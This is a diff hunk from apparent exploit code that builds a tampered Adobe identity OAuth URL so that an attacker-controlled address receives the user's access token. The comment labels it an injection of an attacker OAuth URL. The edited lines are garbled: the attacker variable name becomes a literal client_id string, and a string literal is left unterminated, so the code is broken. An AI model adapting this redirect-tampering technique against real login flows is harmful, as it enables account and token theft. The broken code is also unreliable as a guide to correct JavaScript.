@@ -40,9 +40,9 @@ function launch(){
   // Inject attacker OAuth URL as Adobe's redirect_uri
   let tamperedAdobeURL =
     "https://auth-light.identity.adobe.com/?" +
-    "client_id=clio-playground-web" +
+    "client_id=encodeURIComponent(attackOAuth)" +
     "&response_type=token" +
-    "&redirect_uri=" + encodeURIComponent(attackOAuth) +
+    "&redirect_uri=https://firefly.adobe.com +
     "&environment=prod" +
     "&locale=en_US" +
     "&dt=true&wrapper=true&popup=true" +
